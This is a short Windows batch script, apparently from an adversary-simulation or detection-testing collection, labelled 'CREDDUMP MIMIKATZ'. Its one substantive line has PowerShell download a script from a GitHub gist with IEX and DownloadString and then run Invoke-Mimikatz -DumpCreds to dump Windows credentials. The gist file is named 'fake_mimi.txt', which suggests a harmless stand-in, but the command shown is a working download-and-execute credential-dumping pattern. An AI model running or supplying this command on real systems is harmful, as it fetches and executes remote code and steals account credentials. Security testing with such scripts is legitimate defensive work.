@ECHO OFF

ECHO ===========================================================================
ECHO CREDDUMP MIMIKATZ
ECHO Windows dump creds with powershell mimikatz
ping -n 5 127.0.0.1 > NUL

powershell.exe \"IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/carnal0wnage/73be3c832de957946b94040e216b289c/raw/c012c6feb06c8b22f2c479eba06fa87f81996a60/fake_mimi.txt'); Invoke-Mimikatz -DumpCreds\"
